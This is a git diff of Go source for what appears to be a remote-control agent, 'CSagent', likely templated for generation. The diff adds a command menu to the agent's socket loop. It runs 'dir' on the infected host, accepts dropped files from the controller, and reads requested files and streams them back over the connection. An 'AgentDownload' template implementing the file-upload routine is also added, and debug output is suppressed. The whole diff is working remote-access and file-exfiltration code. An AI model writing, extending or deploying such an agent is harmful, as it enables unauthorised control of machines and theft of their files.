@@ -11,6 +11,7 @@ import (
 	"CSagent/function"
 	"CSagent/upload"
 	"fmt"
+	"time"
 )
 
 var ip string
@@ -52,17 +53,50 @@ connALL2:
 			}
 		} else {
 			for {
-				file, err := function.Read_conn(conn)
-				if file == "no" {
-					fmt.Println("取消链接")
-					goto connALL
+
+				choose, _ := function.Read_conn(conn) //处理选择
+				// fmt.Println(choose)
+				switch choose {
+				case "1":
+					time.Sleep(time.Microsecond * 200)
+					file, err := function.Read_conn(conn)
+					if file == "no" {
+						fmt.Println("取消链接")
+						goto connALL
+					}
+					if err != nil {
+						fmt.Println("读取错误:", err)
+						goto connALL2
+					}
+					/*获取成功*/
+					upload.CreateFile(conn, file)
+				case "2":
+					pwdshell := "dir"
+					output := function.ExecCode(pwdshell)
+					function.Write_conn(conn, output)
+					time.Sleep(time.Microsecond * 200)
+					file, err := function.Read_conn(conn)
+					if file == "no" {
+						fmt.Println("取消链接")
+						goto connALL
+					}
+					if err != nil {
+						fmt.Println("读取错误:", err)
+						goto connALL2
+					}
+					/*获取成功*/
+					code := upload.CheckFile(file)
+					if code == "no" {
+						fmt.Println("文件不存在")
+						continue
+					}
+					filebase := upload.CheckFileName(file)
+					fmt.Println(filebase)
+					// fmt.Println("发送文件名成功")
+					// function.Write_conn(conn, filebase)
+					time.Sleep(time.Microsecond * 200)
+					upload.Doupload(file, conn)
 				}
-				if err != nil {
-					fmt.Println("读取错误:", err)
-					goto connALL2
-				}
-				/*获取成功*/
-				upload.CreateFile(conn, file)
 			}
 		}
 	}
@@ -119,11 +153,11 @@ func Read_conn(conn net.Conn) (string, error) {
 	buf := make([]byte, 512)
 	n, err := conn.Read(buf)
 	if err != nil {
-		fmt.Println("读取错误")
+		// fmt.Println("读取错误")
 	}
 	// fmt.Println(n)
 	output := string(buf[:n])
-	fmt.Println("output:", output)
+	// fmt.Println("output:", output)
 	return output, err
 }
 func Write_conn(conn net.Conn, str string) {
@@ -212,6 +246,9 @@ func Cd_deal(cmd string) error {
 
 
 
+
+
+
 `
 
 var Fun_use string = `package function
@@ -235,6 +272,7 @@ func RandNum() int {
 	r := rand.Intn(65535)
 	return r
 }
+
 
 `
 
@@ -362,4 +400,72 @@ func SHandleError(err error, when string) {
 	}
 }
 
+
+`
+var AgentDownload string = `
+package upload
+
+import (
+	"bufio"
+	"encoding/binary"
+	"fmt"
+	"io"
+	"net"
+	"os"
+	"path/filepath"
+	"time"
+)
+
+func CheckFile(file string) string {
+	_, err := os.Open(file)
+	if err != nil {
+		return "no"
+	} else {
+		return "yes"
+	}
+}
+
+func CheckFileName(file string) string {
+	filename := filepath.Base(file)
+	return filename
+}
+
+func Doupload(file string, conn net.Conn) {
+	fileinfo, _ := os.Stat(file)
+	size := fileinfo.Size()
+	bytes := INt_to_byte(size)
+	conn.Write(bytes)
+	fmt.Println(bytes)
+	//开始传输文件
+	total := 0
+	time.Sleep(time.Microsecond * 300)
+	filebuf := make([]byte, 1000)
+	srcfile, _ := os.Open(file)
+	reader := bufio.NewReader(srcfile)
+	for {
+		n, err := reader.Read(filebuf)
+		if err == io.EOF {
+			fmt.Println("发送完毕")
+			srcfile.Close()
+			return
+		} else {
+			_, e := conn.Write(filebuf[:n])
+			handler(e, "write")
+
+			total += n
+		}
+	}
+}
+
+func handler(e error, when string) {
+	if e != nil {
+		fmt.Println("err", e, when)
+		return
+	}
+}
+func INt_to_byte(int int64) []byte {
+	var buf = make([]byte, 8)
+	binary.BigEndian.PutUint64(buf, uint64(int))
+	return buf
+}
 `
